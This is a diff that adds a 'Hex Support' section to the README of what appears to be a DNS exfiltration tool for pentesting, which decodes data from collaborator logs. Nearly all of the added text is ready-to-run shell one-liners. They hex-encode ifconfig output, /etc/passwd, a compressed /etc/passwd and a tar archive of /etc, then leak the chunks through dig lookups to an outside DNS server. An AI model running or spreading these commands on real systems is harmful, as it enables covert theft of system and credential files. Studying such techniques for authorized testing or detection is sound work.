@@ -105,3 +105,27 @@ dns-parse.py 165cmzb1cu1m3wso0k1k3udr7id91y collaborator2.log | base32 -d
 ```
 dns-parse.py l9vn8f4xr94q4f8j3t6ba8i5bwhm5b collaborator3.log | base32 -d | zcat
 ```
+
+## Hex Support
+
+Hex support is coming, here's how to send hex-encoded data:
+
+Send STDOUT:
+```
+ifconfig | xxd -p -c31 | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
+```
+
+Send a file:
+```
+xxd -p -c31 < /etc/passwd | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
+```
+
+Send a compressed file:
+```
+gzip - < /etc/passwd | xxd -p -c31 | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
+```
+
+Send a compressed tar archive:
+```
+tar czf - /etc | xxd -p -c31 | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
+```
